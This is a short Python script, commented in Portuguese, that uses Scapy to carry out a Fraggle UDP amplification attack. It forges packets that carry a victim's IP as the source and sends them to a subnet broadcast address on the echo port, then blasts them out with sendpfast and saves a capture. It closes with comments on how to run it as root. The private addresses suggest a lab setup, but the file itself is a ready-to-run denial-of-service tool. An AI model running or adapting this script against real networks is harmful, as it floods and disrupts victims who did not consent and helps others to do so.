from scapy.all import *
import random

# CONFIGURAÇÃO
VICTIM_IP      = "192.168.100.2"      # IP da vítima (spoof)
BROADCAST_IP   = "192.168.100.255"      # Rede de broadcast do alvo
ECHO_PORT      = 7                    # Echo service UDP
CHARGEN_PORT   = 19                   # Chargen service UDP
IFACE          = "enp0s3"

def fraggle_udp_echo_flood(packets):
    pkts = []
    for _ in range(packets):
        # Spoofing: origem = vítima, destino = broadcast
        udp_pkt = Ether() / IP(src=VICTIM_IP, dst=BROADCAST_IP) / \
                  UDP(sport=50001, dport=ECHO_PORT) / \
                  Raw(load=b"X")
        pkts.append(udp_pkt)
    print(f"Enviando {packets} pacotes UDP Fraggle para {BROADCAST_IP}:{ECHO_PORT}...")
    sendpfast(pkts, iface=IFACE, file_cache=True)
    wrpcap("udp_fraggle.pcap", pkts)

if __name__ == "__main__":
    fraggle_udp_echo_flood(1000)

# sudo PYTHONPATH=$HOME/scapy python3 udp_fraggle.py
# sudo nc -lu 50001
